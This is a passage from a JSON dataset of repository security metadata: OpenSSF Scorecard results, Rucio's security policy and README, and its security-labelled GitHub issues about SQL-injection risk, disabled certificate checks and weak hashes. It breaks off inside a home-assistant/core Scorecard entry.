                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/autotest.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/imagecache.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/integration_tests.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/unit_tests.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/vo_tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/rucio/rucio/contents/.github/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nRucio follows a release policy, based on [semantic versioning](https://semver.org),\nwith **major** (named) releases. Approximately every 4 months we produce a major \nrelease with a version number like **x.0.0** (with x > 0). This release line is \nmaintained with minor/patch releases published every two weeks.\n\nTypically once a year we will designate a release line a **Long-term Support** (LTS) \nrelease line. This release line will be supported with **security** and **critical** \npatches for approximately two years. It is foreseen to have an overlap of at least \n12 months between two LTS release lines, to give communities a comfortable time \nwindow to deploy the new LTS release.\n\n**Release lines other than the latest and active LTS ones are not maintained!**\n\nFor further information, including the current list of maintained release lines, \nread the [release policy](https://rucio.cern.ch/documentation/started/releasepolicy) \non the Rucio documentation. \n\n## Reporting a Vulnerability\n\nPlease report it privately using GitHub's [Report a vulnerability](https://github.com/rucio/rucio/security/advisories/new) \noption. You can also reach the security team at rucio-security@cern.ch.\n",
        "project_all_labels": [
            "❤️ help welcome ❤️",
            "Authentication & Authorisation",
            "backport",
            "bug",
            "Clients",
            "Consistency checks",
            "Core & Internals",
            "Database",
            "Dataset deletion",
            "Deletion",
            "dependencies",
            "DIRAC",
            "Discussion needed",
            "Docker & Kubernetes",
            "Documentation",
            "enhancement",
            "feature",
            "github_actions",
            "good first issue",
            "hotfix",
            "Life time model",
            "LTS",
            "Messaging",
            "Metadata",
            "Monitoring & Traces",
            "Multi VO",
            "Overview",
            "patch",
            "Policies",
            "Priority: High",
            "Priority: Low",
            "Probes & Alarms",
            "Protocols",
            "python",
            "Rebalancing",
            "Recovery",
            "Release management",
            "Replicas",
            "REST & API",
            "Rules",
            "Security",
            "Subscriptions",
            "Testing",
            "Transfers",
            "WebUI"
        ],
        "README_content": "# Rucio - Scientific Data Management\n\nRucio is a software framework that provides functionality to organize, manage, and access large volumes of scientific data using customisable policies.\nThe data can be spread across globally distributed locations and across heterogeneous data centers, uniting different storage and network technologies as a single federated entity.\nRucio offers advanced features such as distributed data recovery or adaptive replication, and is highly scalable, modular, and extensible.\nRucio has been originally developed to meet the requirements of the high-energy physics experiment ATLAS, and is continuously extended to support LHC experiments and other diverse scientific communities.\n\n## Documentation\n\nGeneral information, API/REST description and guides can be found in our [documentation](https://rucio.cern.ch/documentation) or on our [webpage](https://rucio.cern.ch).\n\n## Try it out\n\nWe provide a [dockerized environment](https://github.com/rucio/rucio/tree/master/etc/docker/dev) which serves both as a demo environment and a development environment.\nIt includes all the necessary preconfigured components for multiple storage and transfers developments.\n\n## Developers\n\nFor information on how to contribute to Rucio, please refer and follow our [CONTRIBUTING](https://rucio.cern.ch/documentation/contributing) guidelines. We strongly recommend to use the [dockerized environment](https://github.com/rucio/rucio/tree/master/etc/docker/dev) for development.\n\n## Operators\n\nTo learn how to deploy and configure Rucio, consult the [documentation](https://rucio.cern.ch/documentation) available online.\n\n## Getting Support\n\nIf you are looking for support, please contact us via one of our [official channels](https://rucio.cern.ch/documentation/contact_us/).\n",
        "num_commits": 13214,
        "project_age_days": 2548,
        "project_created_at": "2017-11-07",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 126,
        "num_pull": 4429,
        "num_issues": 7116,
        "num_opening_issue": 293,
        "project_size(kB)": 59776,
        "num_stargazers": 246,
        "num_watchers": 246,
        "num_forks": 313,
        "num_subscribers": 22,
        "SecurityPolicy_created_at": "2024-07-26 13:32:51",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "e892873857a2bd45762070f44743f99fe280a17f",
                "url": "https://github.com/rucio/rucio/commit/e892873857a2bd45762070f44743f99fe280a17f",
                "date": "2024-07-29 08:41:04"
            },
            {
                "commit_id": "eff49edb057e1c10c4f55c6b98999d08f20a5c95",
                "url": "https://github.com/rucio/rucio/commit/eff49edb057e1c10c4f55c6b98999d08f20a5c95",
                "date": "2024-07-26 13:32:51"
            }
        ],
        "project_security_labels": [
            "Security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/rucio/rucio/issues/7086",
                "title": "GITHUB_TOKEN: adjust permissions",
                "labels": [
                    "Testing",
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 7086,
                "id": 2524247493,
                "state": "open",
                "project_created_at": "2024-09-13T08:42:45Z",
                "closed_at": null,
                "body": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/rucio/rucio/issues/7075",
                "title": "Fix `TripleDES` issue that's blocking `cryptography` dependency update ",
                "labels": [
                    "bug",
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 7075,
                "id": 2505000576,
                "state": "closed",
                "project_created_at": "2024-09-04T10:56:58Z",
                "closed_at": "2024-09-12T12:28:39Z",
                "body": "### Description\n\nhttps://github.com/rucio/rucio/pull/7073\r\n\r\nErrors:\r\n```\r\nE   assert not '/opt/venv/lib64/python3.9/site-packages/paramiko/pkey.py:100: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from this module in 48.0.0.\\n  \"cipher\": algorithms.TripleDES,\\n/opt/venv/lib64/python3.9/site-packages/paramiko/transport.py:259: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from this module in 48.0.0.\\n  \"class\": algorithms.TripleDES,\\n'\r\n```\n\n### Steps to reproduce\n\nN/A\n\n### Rucio Version\n\n_No response_\n\n### Additional Information\n\n_No response_",
                "comments": [
                    {
                        "body": "Related: https://github.com/paramiko/paramiko/issues/2419",
                        "user": "rdimaio",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-09-04T10:59:35Z",
                        "url": "https://github.com/rucio/rucio/issues/7075#issuecomment-2328585211"
                    },
                    {
                        "body": "This was fixed in `paramiko==3.4.1`: https://www.paramiko.org/changelog.html",
                        "user": "rdimaio",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-09-04T11:03:37Z",
                        "url": "https://github.com/rucio/rucio/issues/7075#issuecomment-2328596173"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/rucio/rucio/issues/6891",
                "title": "Enable security scanning on LTS branches",
                "labels": [
                    "LTS",
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6891,
                "id": 2400946299,
                "state": "open",
                "project_created_at": "2024-07-10T14:33:00Z",
                "closed_at": null,
                "body": null,
                "comments": [
                    {
                        "body": "We cannot use [`target-branch`](https://docs.github.com/en/code-security/dependabot/dependabot-version-updates/configuration-options-for-the-dependabot.yml-file#target-branch) as it [does not support security updates yet:](https://github.blog/changelog/2024-03-18-dependabot-security-updates-work-with-private-registries-even-if-target-branch-is-specified/)\r\n\r\n> Note that security updates still does not support target-branch configuration.\r\n\r\nWe have a few options. In order of what I think would be best to worst:\r\n-  Option 1: Scanning the dependencies of LTS release as part of a periodic GH Action (https://github.com/actions/dependency-review-action) on the LTS branches, with a step that fails in case any dependencies are vulnerable. The workflow can then either:\r\n   - Open an issue (https://github.com/JasonEtco/create-an-issue), e.g. \"release-X-LTS, vulnerable dependencies found\" which would require manual updating from our side\r\n   - Open a PR (https://stackoverflow.com/questions/68057744/create-pull-request-with-github-action) to automatically update the dependencies - this might potentially get a bit too complicated and not worth the time (we'd also have to change this once we go from LTS releases that use the old `requirements` structure to the [new structure](https://github.com/rucio/rucio/pull/6767), unless we want to modify the LTS branches now to pin all dependencies in the same way that we're doing in the main branch\r\n- Option 2: Setting `open-pull-requests-limit` > 0 for LTS branches. The downside is that this will cause dependency upgrades for non-security updates too, which seems unnecessary.\r\n- Option 3: Manually updating the vulnerable dependencies in LTS branches whenever we get a security alert on the main branch; I think this relies too much on human effort. \r\n\r\n@bari12 thoughts?\r\n\r\nEdit: Another method, found [here](https://stackoverflow.com/a/71894638):\r\n- In the repo settings, we can switch default branch to an `LTS` branch, which triggers a Dependabot check right away and displays any vulnerabilities. On a regular basis (e.g. monthly) we could do:\r\n    1. Switch default branch to LTS branch\r\n    2. Check Dependabot vulnerabilities\r\n    3. Trigger Dependabot PRs for vulnerabilities, check CI passes, merge them\r\n    4. Switch default branch back to main branch\r\n\r\nThis is probably the simplest approach, but there might be downsides",
                        "user": "rdimaio",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-07-11T13:30:19Z",
                        "url": "https://github.com/rucio/rucio/issues/6891#issuecomment-2222948921"
                    },
                    {
                        "body": "Discussed with Martin - we will go with the option 1 mentioned in the previous post",
                        "user": "rdimaio",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-07-23T10:52:23Z",
                        "url": "https://github.com/rucio/rucio/issues/6891#issuecomment-2244888950"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/rucio/rucio/issues/6771",
                "title": "Address Dependabot alert #15",
                "labels": [
                    "Release management",
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6771,
                "id": 2308104267,
                "state": "closed",
                "project_created_at": "2024-05-21T11:46:52Z",
                "closed_at": "2024-05-22T09:16:54Z",
                "body": "Opening an issue since you can't comment directly on Dependabot alerts.\r\n\r\nAlert in question: https://github.com/rucio/rucio/security/dependabot/15\r\n\r\nFrom the logs: https://github.com/rucio/rucio/security/dependabot/15/update-logs/367592962 - the reason why Dependabot couldn't update this manually is \"Dependabot can't update vulnerable dependencies for projects without a lockfile or pinned version requirement as the currently installed version of requests isn't known.\"\r\n\r\n`requests` is not pinned, as seen here https://github.com/rucio/rucio/blob/c8cb923ba46b8ac87c21c74eb49ba41967767742/requirements.txt#L2\r\n\r\nI believe the alert fired because of this line: https://github.com/rdimaio/rucio/blob/0173ff7c590cb413ded05544840adeb3df1931c3/lib/rucio/rse/protocols/webdav.py#L536, where there's a `Session.request` with `verify=False`. This was an existing issue, but Dependabot only saw it now because of the `noqa` comment that was added as part of this PR: https://github.com/rucio/rucio/pull/6703/files.\r\n\r\nThe easiest solution according to https://github.com/rucio/rucio/security/dependabot/15 would be to increase the lower bound version of `requests` to `2.32.0`. I'm in favour of this solution, as the current `requests` version range is not based on any specific requirements AFAIK.\r\n\r\nThe other solutions proposed are:\r\n- not using `verify=False` for the first request to a host while using a Requests Session - I'm not sure if this might break the functionality of that line\r\n- call `close()` on Session objects to clear existing connections if `verify=False` is used. - I think this is the safer/simpler option from the point of view of not breaking current functionality.",
                "comments": [
                    {
                        "body": "Looking at the `requests` changelog (https://github.com/psf/requests/blob/main/HISTORY.md):\r\n\r\nThe only breaking changes announced since `2.25.1` (our current lower version limit for `requests`) are:\r\n- [2.28.0](https://github.com/psf/requests/blob/main/HISTORY.md#2280-2022-06-09): Dropping support for Python 2.7 and 3.6. The Rucio [client](https://github.com/rucio/rucio/blob/master/setup_rucio_client.py), [server](https://github.com/rucio/rucio/blob/master/setup_rucio.py) and [webui](https://github.com/rucio/rucio/blob/master/setup_webui.py) require Python 3.9+ at setup, so this does not affect us.\r\n- [2.30.0](https://github.com/psf/requests/blob/main/HISTORY.md#2300-2023-05-03): Added support for urllib3 2.0. This is only a breaking change if we also upgrade to `urllib3 2.0`. However, we are pinned to `urllib3 1.x`: https://github.com/rucio/rucio/blob/c8cb923ba46b8ac87c21c74eb49ba41967767742/requirements.txt#L3C1-L3C17, so this does not affect us.\r\n\r\nIMO it's safe to upgrade the lower version limit for `requests` to 2.32.0 here.",
                        "user": "rdimaio",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-05-21T11:53:04Z",
                        "url": "https://github.com/rucio/rucio/issues/6771#issuecomment-2122461644"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/rucio/rucio/issues/6704",
                "title": "Security: Third-party GH workflow actions are not pinned by full commit SHA",
                "labels": [
                    "Core & Internals",
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6704,
                "id": 2252715145,
                "state": "closed",
                "project_created_at": "2024-04-19T11:12:48Z",
                "closed_at": "2024-04-19T15:02:14Z",
                "body": "See: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions:\r\n\r\n> Pinning an action to a full length commit SHA is currently the only way to use an action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\r\n\r\n",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/rucio/rucio/issues/6666",
                "title": "SQL Injection risks in Postgres meta queries",
                "labels": [
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6666,
                "id": 2235427555,
                "state": "open",
                "project_created_at": "2024-04-10T11:59:23Z",
                "closed_at": null,
                "body": "Example problematic query:\r\n\r\nhttps://github.com/rucio/rucio/blob/834a7c06e438a7ba2baecbee648f5c83e90e5bcc/lib/rucio/core/did_meta_plugins/postgres_meta.py#L85\r\n\r\nFrom the `psycopg2` docs (https://www.psycopg.org/docs/usage.html#the-problem-with-the-query-parameters):\r\n\r\n> Warning\r\n> Never, never, NEVER use Python string concatenation (+) or string parameters interpolation (%) to pass variables to a SQL query string. Not even at gunpoint. \r\n\r\nAffected queries should be rewritten in the way proposed here https://stackoverflow.com/questions/45128902/psycopg2-and-sql-injection-security to prevent SQL injections.",
                "comments": [
                    {
                        "body": "Blocked by https://github.com/rucio/rucio/issues/6669",
                        "user": "rdimaio",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-04-11T13:55:55Z",
                        "url": "https://github.com/rucio/rucio/issues/6666#issuecomment-2049752480"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/rucio/rucio/issues/6665",
                "title": "Usage of insecure hash functions: `sha1` and `md5`",
                "labels": [
                    "bug",
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6665,
                "id": 2235293338,
                "state": "open",
                "project_created_at": "2024-04-10T10:48:06Z",
                "closed_at": null,
                "body": "### Description\n\nThe following insecure hash functions are currently in use within Rucio:\r\n- `sha1`\r\n  - https://crypto.stackexchange.com/questions/48289/how-secure-is-sha1-what-are-the-chances-of-a-real-exploit \r\n  - Vulnerable to collision attacks: https://www.nist.gov/news-events/news/2022/12/nist-retires-sha-1-cryptographic-algorithm\r\n- `md5`\r\n  - Vulnerable to collision attacks:\r\n    - https://security.stackexchange.com/questions/138363/why-is-md5-considered-a-vulnerable-algorithm\r\n    - https://stackoverflow.com/questions/30496061/why-not-use-md5-for-password-hashing\r\n    - https://security.stackexchange.com/questions/19906/is-md5-considered-insecure\r\n    - https://security.stackexchange.com/questions/106843/have-weaknesses-in-sha-1-and-md5-ever-actually-been-successfully-used-in-an-atta\r\n\r\nThe linter log below lists the uses identified by the linter, but there are other instances as well. For example, `get_auth_token_user_pass` expects a SHA1 hash of the password:\r\n\r\nhttps://github.com/rucio/rucio/blob/834a7c06e438a7ba2baecbee648f5c83e90e5bcc/lib/rucio/api/authentication.py#L124-L147\r\n\r\n## To do\r\nIn each instance of `sha1` and `md5` usages:\r\n- If possible, migrate to a stronger hash algorithm\r\n  - For password hashing in particular, see here for recommendations: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html\r\n  - For most cases, SHA-256 is a good compromise between speed and safety\r\n- Otherwise, add the inline comment `# noqa: S324`\r\n\r\n## Linter log\r\n```\r\n❯ ruff check --select S324                                                                                                                                                                                                                                                                                               ─╯\r\nlib/rucio/common/dumper/data_models.py:175:13: S324 Probable use of insecure hash functions in `hashlib`: `sha1`\r\nlib/rucio/common/utils.py:303:16: S324 Probable use of insecure hash functions in `hashlib`: `md5`\r\nlib/rucio/core/did.py:98:20: S324 Probable use of insecure hash functions in `hashlib`: `md5`\r\nlib/rucio/core/oidc.py:131:11: S324 Probable use of insecure hash functions in `hashlib`: `md5`\r\nlib/rucio/daemons/auditor/hdfs.py:58:13: S324 Probable use of insecure hash functions in `hashlib`: `sha1`\r\nlib/rucio/daemons/auditor/srmdumps.py:249:9: S324 Probable use of insecure hash functions in `hashlib`: `sha1`\r\nlib/rucio/daemons/c3po/c3po.py:220:48: S324 Probable use of insecure hash functions in `hashlib`: `md5`\r\nlib/rucio/rse/protocols/protocol.py:114:16: S324 Probable use of insecure hash functions in `hashlib`: `md5`\r\nFound 8 errors.\r\n```\r\n\r\nAlso other cases - e.g. `get_auth_token_user_pass`.\r\n\r\n\r\n## See also\r\n- https://docs.astral.sh/ruff/rules/hashlib-insecure-hash-function/\n\n### Steps to reproduce\n\nN/A\n\n### Rucio Version\n\n_No response_\n\n### Additional Information\n\n_No response_",
                "comments": [
                    {
                        "body": "The majority of these are just for the lfn2pfn methods, there it should be fine. The oidc one which shows up is something to check though.",
                        "user": "bari12",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2024-04-17T15:48:07Z",
                        "url": "https://github.com/rucio/rucio/issues/6665#issuecomment-2061616818"
                    },
                    {
                        "body": "> The oidc one which shows up is something to check though.\r\n\r\nA hash function is used to simplify avoiding they key restrictions of either dogpile.cache or Memcached (we could have devised a function that removes or replaces unacceptable characters instead). The payload that is hashed cannot be affected by a user, whether directly or indirectly. Given that MD5 is less expensive for the CPU, I don’t see sufficient motivation to replace it.",
                        "user": "dchristidis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-04-17T17:15:50Z",
                        "url": "https://github.com/rucio/rucio/issues/6665#issuecomment-2061800980"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/rucio/rucio/issues/6656",
                "title": "`requests` call with `verify=False` possibly disabling SSL certificate checks",
                "labels": [
                    "bug",
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6656,
                "id": 2233186611,
                "state": "closed",
                "project_created_at": "2024-04-09T11:05:35Z",
                "closed_at": "2024-04-17T17:27:06Z",
                "body": "### Description\n\nThere are some `requests` calls that state `verify=False` (See linter log below). This is potentially dangerous - for HTTPS requests, it disables SSL certificate checks.\r\n\r\nI am not sure why `verify=False` was set in these cases; opening this issue partly to see if we can understand the context on this.\r\n\r\n## To do\r\nFor each request listed:\r\n- If SSL certificate checks can be performed, remove the `verify=False`\r\n- If SSL certificate checks cannot be performed, add the inline comment `# noqa: S501`\r\n\r\n## See also:\r\n- https://docs.astral.sh/ruff/rules/request-with-no-cert-validation/\r\n- https://docs.openstack.org/bandit/1.4.0/plugins/request_with_no_cert_validation.html\r\n\r\n## Linter log\r\n```\r\n❯ ruff check --select S501                                                                                                                                                                                                                                                                                              \r\nlib/rucio/client/touchclient.py:74:23: S501 Probable use of `requests` call with `verify=False` disabling SSL certificate checks\r\nlib/rucio/common/utils.py:1330:56: S501 Probable use of `requests` call with `verify=False` disabling SSL certificate checks\r\nlib/rucio/core/replica.py:705:87: S501 Probable use of `requests` call with `verify=False` disabling SSL certificate checks\r\nlib/rucio/core/replica.py:2953:35: S501 Probable use of `requests` call with `verify=False` disabling SSL certificate checks\r\nlib/rucio/core/replica_sorter.py:182:58: S501 Probable use of `requests` call with `verify=False` disabling SSL certificate checks\r\nFound 5 errors.\r\n```\n\n### Steps to reproduce\n\nN/A\n\n### Rucio Version\n\n_No response_\n\n### Additional Information\n\n_No response_",
                "comments": [
                    {
                        "body": "I would consider this a duplicate of #6632.",
                        "user": "dchristidis",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-04-17T17:05:38Z",
                        "url": "https://github.com/rucio/rucio/issues/6656#issuecomment-2061785016"
                    },
                    {
                        "body": "> I would consider this a duplicate of #6632.\r\n\r\nI agree, I hadn't seen that issue. I will close this one in favour of that one, as it's also more comprehensive of other instances where `verify=False`.",
                        "user": "rdimaio",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-04-17T17:27:06Z",
                        "url": "https://github.com/rucio/rucio/issues/6656#issuecomment-2061826483"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/rucio/rucio/issues/6620",
                "title": "Security: Address security issues in repository",
                "labels": [
                    "enhancement",
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 6620,
                "id": 2220536975,
                "state": "open",
                "project_created_at": "2024-04-02T13:30:29Z",
                "closed_at": null,
                "body": "I'm enabling security linting via ruff's `flake8-bandit` linter. Will be using this issue as a general tracker for the security issues detected.\r\n\r\nSubtasks:\r\n- [ ] https://github.com/rucio/rucio/issues/6665\r\n- [ ] https://github.com/rucio/rucio/issues/6632\r\n- [ ] https://github.com/rucio/rucio/issues/6666 (not detected by the linter, but still a security issue worth fixing)",
                "comments": [],
                "pull_request": null
            }
        ],
        "SecurityPolicy_reporting_mechanism": "advisory",
        "num_security_issues_after_policy": 2,
        "num_security_issue_and_pull": 9,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/rucio/rucio/issues/7086",
                "title": "GITHUB_TOKEN: adjust permissions",
                "labels": [
                    "Testing",
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 7086,
                "id": 2524247493,
                "state": "open",
                "project_created_at": "2024-09-13T08:42:45Z",
                "closed_at": null,
                "body": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/rucio/rucio/issues/7075",
                "title": "Fix `TripleDES` issue that's blocking `cryptography` dependency update ",
                "labels": [
                    "bug",
                    "Security"
                ],
                "user": "rdimaio",
                "issue_author_association": "CONTRIBUTOR",
                "number": 7075,
                "id": 2505000576,
                "state": "closed",
                "project_created_at": "2024-09-04T10:56:58Z",
                "closed_at": "2024-09-12T12:28:39Z",
                "body": "### Description\n\nhttps://github.com/rucio/rucio/pull/7073\r\n\r\nErrors:\r\n```\r\nE   assert not '/opt/venv/lib64/python3.9/site-packages/paramiko/pkey.py:100: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from this module in 48.0.0.\\n  \"cipher\": algorithms.TripleDES,\\n/opt/venv/lib64/python3.9/site-packages/paramiko/transport.py:259: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from this module in 48.0.0.\\n  \"class\": algorithms.TripleDES,\\n'\r\n```\n\n### Steps to reproduce\n\nN/A\n\n### Rucio Version\n\n_No response_\n\n### Additional Information\n\n_No response_",
                "comments": [
                    {
                        "body": "Related: https://github.com/paramiko/paramiko/issues/2419",
                        "user": "rdimaio",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-09-04T10:59:35Z",
                        "url": "https://github.com/rucio/rucio/issues/7075#issuecomment-2328585211"
                    },
                    {
                        "body": "This was fixed in `paramiko==3.4.1`: https://www.paramiko.org/changelog.html",
                        "user": "rdimaio",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2024-09-04T11:03:37Z",
                        "url": "https://github.com/rucio/rucio/issues/7075#issuecomment-2328596173"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 2,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "home-assistant/core",
        "project_url": "https://github.com/home-assistant/core",
        "SSF": {
            "date": "2024-10-29T20:02:08+07:00",
            "repo": {
                "name": "github.com/home-assistant/core",
                "commit": "f194a689ccaec56cc4234fd8de6dc50c34334fa0"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 7.2,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'dev'",
                        "Info: 'allow deletion' disabled on branch 'rc'",
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'dev'",
                        "Info: 'force pushes' disabled on branch 'rc'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'dev'",
                        "Warn: required approving review count is 1 on branch 'rc'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'dev'",
                        "Warn: codeowners review is not required on branch 'rc'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Info: status check found to merge onto on branch 'dev'",
                        "Warn: no status checks found to merge onto branch 'rc'",
                        "Warn: no status checks found to merge onto branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'dev'",
                        "Info: PRs are required in order to make changes on branch 'rc'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 6,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 9,
                    "reason": "29 out of 30 merged PRs checked by a CI test -- score normalized to 9",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: aws contributor org/company found, tibber contributor org/company found, affolter-engineering contributor org/company found, Bluetooth-Devices contributor org/company found, home-assistant @hassio-addons contributor org/company found, PyCQA contributor org/company found, aio-libs contributor org/company found, ratgdo contributor org/company found, ovdingen contributor org/company found, pylint-dev contributor org/company found, improv-wifi contributor org/company found, news corp contributor org/company found, UpCloudLtd contributor org/company found, home-assistant @nabucasa contributor org/company found, shenv contributor org/company found, cleverreach contributor org/company found, home-assistant-libs contributor org/company found, home-assistant-ecosystem contributor org/company found, home-assistant contributor org/company found, python-kasa contributor org/company found, pyenphase contributor org/company found, OpenHomeFoundation contributor org/company found, nabucasa contributor org/company found, libwww-perl contributor org/company found, rpm-software-management contributor org/company found, esphome contributor org/company found, python-zeroconf contributor org/company found, uilibs contributor org/company found, SINTEFMedtek contributor org/company found, upcloudltd contributor org/company found, NabuCasa contributor org/company found, CpanelInc contributor org/company found, ESPHome-RATGDO contributor org/company found, NixOS contributor org/company found, nabucasa lekkerkerker software development contributor org/company found, hacs contributor org/company found, hassio-addons contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 37 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
